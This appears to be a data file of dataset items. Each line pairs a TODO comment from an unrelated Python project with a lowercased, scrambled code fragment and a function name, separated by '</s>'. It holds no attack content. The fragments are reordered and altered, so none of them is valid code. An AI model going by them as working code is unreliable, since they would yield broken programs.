# todo: deprecation warning </s> class defaultserializer(self.model_serializer_class):	DefaultSerializer class Meta: model = self.model
# todo: systemhistory_user_id </s> )	save systemhistory_old_value = 'No analysisstatus', systemhistory_new_value = self.analysisstatus.analysisstatus_name, systemhistory.save() self.previous_analysisstatus = self.analysisstatus
# todo: figure out a way to set __name__ for partial object, update_wrapper </s> group_template = [(lambda a: a) if type(f) != partial and f.__name__ == 'dflt_f' else (lambda a: none)	process_group from functools import partial empty = () for f in ffuncs] for group, tups in groupby(inp,
# todo: test 2a: planilha total mais atualizada que deployed (total + deployed) </s> if date in cases:	get_state_data for spreadsheet in spreadsheets: date = spreadsheet.date continue report_data = reports.get(date, defaultdict(list))
# todo: end remove hosts/when block </s> if 'stdin' in kwargs:	pop_global_op_kwargs 'when': get_kwarg('when', True), } show_stdin_global_warning() for _, kwarg_configs in OPERATION_KWARGS.items():
self.ops_config = none  # todo </s> if self.appname:	set_config self._update_addresses()
# todo: action value doesn't exist for beta </s> baseline_policy = dict(	test_advantage_estimate horizon=2, estimate_horizon='early', estimate_actions=True, estimate_advantage=True ) network=dict(type='auto', size=7, depth=1, internal_rnn=2), distributions=dict(float='gaussian')
# todo: will be replaced with exception in future releases </s> logger.error('telegram does not support reply keyboard row width over %d.' % self.max_row_keys)	ReplyKeyboardMarkup def __init__(self, resize_keyboard=None, one_time_keyboard=None, selective=None, row_width=3): if row_width > self.max_row_keys: row_width = self.max_row_keys self.resize_keyboard = resize_keyboard
# todo: differentiate between tags assigned to the instance and a m2m field for tags (ex: configcontext) </s> elif key == 'tags':	model_to_dict if key.startswith('_'): del model_dict[key] model_dict[key] = ','.join(sorted([tag.name for tag in model_dict['tags']])) elif model_dict[key] and type(model_dict[key]) in (list, tuple) and hasattr(model_dict[key][0], 'pk'):
false)  # todo: check if this should be secure </s> enclosures = self.item_enclosures(item)	get_feed link = add_domain(current_site.domain, self.item_link(item), feed.add_item(title=title, link=link,
# @todo implement threading here. </s> for project in projects:	issues issues = [] projects = self.projects for project_id, project_name in project.iteritems(): log.debug("Getting tasks for #" + project_id + " " + project_name + '"')
# todo: allow partial prase complete </s> if shouldeval and prase_input_complete(data):	create_multi_prompt data = data.replace('\r', '\n') shouldeval = data[-1] == "\n" and len(event.current_buffer.document.text_after_cursor) == 0 data = data.rstrip("\n") event.current_buffer.insert_text(data)
# todo: old requirement, remove in future versions? </s> self.signin()	TestPrivacyWebPublic res = self.app.get(url, follow_redirects=True) dom = BeautifulSoup(res.data) res = self.app.get(url, follow_redirects=True) dom = BeautifulSoup(res.data)
## todo : add layers </s> pass	discriminator def discriminator(inputs, batch_size=batch_size, is_train=True, reuse=False):
# todo see #682 detailedlist should have a _selection attribute + selection property like tree </s> self.interface.on_select(self.interface, row=node)	gtk_on_select else: node = None
# todo only do these thing if status is true </s> elif endpoint.state == 'unknown':	process status = Actions( endpoint, self.s.sdnc).mirror_endpoint() if self.s.investigations < self.controller['max_concurrent_reinvestigations']: self.s.investigations += 1
# todo verify results </s> self.assertrequest(responsecode=200)	test_post_query_json_content content_type=b"application/json" )
# todo: parse automatically the 'swap' method </s> def _swap(args): a = list(args[0]); b = int(args[1]); c = a[0]; a[0] = a[b % len(a)]; a[b] = c; return "".join(a)	JSVM _js_methods = {} def __init__(self, code=""): def _split(args): return "" def _slice(args): return args[0][int(args[1]):]
# todo make proper json-ld definition </s> 'path': 'path name of an entity relative to the searched base dataset',	_get_search_schema definitions = { '@id': 'unique identifier of an entity', 'parentds': 'path of the datasets that contains an entity', 'type': {
# todo: make sure this openssl command works everywhere, maybe we should use a text_base64_decode? </s> result = run("echo '%s' | openssl base64 -a -d -out %s" % (base64.b64encode(content), shell_safe(location)))	file_write **{MODE_SUDO: use_sudo} ): if "openssl:Error" in result: fabric.api.abort('cuisine.file_write("%s",...) failed because openssl does not support base64 command.' % (location))
# todo this pipeline may drop nulls in prediction rows if impute=false </s> ('imputation', transformers.dataframeimputer(impute=impute)),	full_pipeline ('remove_DTS_columns', filters.DataframeDateTimeColumnSuffixFilter()), ('remove_grain_column', filters.DataframeColumnRemover(grain_column)), ('null_row_filter', filters.DataframeNullValueFilter(excluded_columns=None)), ('convert_target_to_binary', transformers.DataFrameConvertTargetToBinary(model_type, predicted_column)),
# todo: split name and email address </s> self.add_attribute('return-path', value=self.__email['return-path'])	generate_attributes self.add_attributes('from', *to_add) if 'Return-Path' in self.__email: if 'User-Agent' in self.__email: self.add_attribute('user-agent', value=self.__email['User-Agent'])
self.assertequal(self.todolist.count(), 3)  # force won't delete subtasks </s> self.assertequal(self.output, "|  2| bar p:1\nremoved: foo id:1\n")	test_del4 command.execute() self.assertTrue(self.todolist.is_dirty()) self.assertEqual(self.errors, "")
# todo: this test requires manifold access, see: t88318502 </s> self._test_model("coco-instancesegmentation/mask_rcnn_r_50_fpn_3x.yaml")	testMaskRCNN def testMaskRCNN(self):
# todo: remove when postgres migration is done </s> config.add_request_method(	includeme config.add_directive('add_search_matcher', lambda c, m: c.registry[MATCHERS_KEY].append(m)) lambda r: _legacy_get_client(r.registry.settings), name='legacy_es',
# todo: @sbharadwajj implement and test </s> raise notimplementederror	_jac_mat_prod def _jac_mat_prod(self, module, g_inp, g_out, mat):
# todo: find out why pypy 1.8 with close_fds=true triggers </s> close_fds = platform.python_implementation() != 'pypy'	_spawn portage.process.spawned_pids.append(pid) return [pid] portage.process._setup_pipes(fd_pipes, close_fds=close_fds) signal.signal(signal.SIGINT, signal.SIG_DFL)
# todo: check error location </s> assert result.data == {'nest': none}	test_non_nullable_list_of_nullables assert len(result.errors) == 1 assert result.errors[0].message == 'Cannot return null for non-nullable type.'
# todo keep playback.state unchanged </s> self.backend.playback.previous().get()	Previous def Previous(self): logger.debug(u'%s.Previous called', PLAYER_IFACE)
# todo: we lose the response code, so we can't check this </s> def _check_uri(res):	test_PUT_NEWFILEURL_mutable d = self.PUT(self.public_url + "/foo/new.txt?mutable=true", self.NEWFILE_CONTENTS) u = uri.from_string_mutable_filenode(res) self.failUnless(u.is_mutable())
# todo(dcramer): once we migrate to job plans we can remove this </s> warnings.warn(	_sync_job try: if not job_plan: 'Got sync_build task without job plan: %s' % (job_id,)) execute = sync_with_builder
#@todo: remove in 0.4.10 </s> def load_account(self):	load_account orig_name = self.__name__ self.__name__ = (orig_name + ".py").replace("Folder.py", "").replace(".py", "")
